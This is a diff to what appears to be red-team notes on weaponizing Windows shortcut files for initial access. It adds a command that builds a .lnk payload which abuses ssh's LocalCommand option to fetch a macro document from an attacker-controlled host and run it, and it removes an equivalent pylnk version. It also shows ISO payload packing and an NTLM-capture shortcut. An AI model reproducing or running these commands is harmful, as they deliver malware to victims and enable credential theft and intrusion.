@@ -27,16 +27,16 @@ $ packmypayload --out-format iso /tmp/payloads/ Patches.iso
 $ rm archive.zip
 ```
 
-#### 1.1.2 - Capture NTLM Relay
+#### 1.1.2 - SSH File Transfer via Office Macro
+
+```
+$ shortcutgen -p lnk -c "C:\Windows\System32\OpenSSH\ssh.exe" -a "-o \"PermitLocalCommand=yes\" -o \"LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc\" <username>@<attacker_IP>" payload.lnk
+```
+
+#### 1.1.3 - Capture NTLM Relay
 
 ```
 $ shortcutgen -p lnk -i "FILESERVER" -s "Documents" -n "document.docx" -d "A hosting server." -o fileserver.lnk
-```
-
-TODO: Provide use cases if any (refer to the link for SSH)
-
-```
-$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "-o \"PermitLocalCommand=yes\" -o \"LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc\" <username>@<attacker_IP>" payload.lnk
 ```
 
 Scriptlet file
@@ -162,7 +162,7 @@ try {
 
 ### Backlinks
 
-- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Windows/Manual]]
+- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Windows/Manual|Manual: Windows Shortcut File]]
 
 ### Source Repositories
 
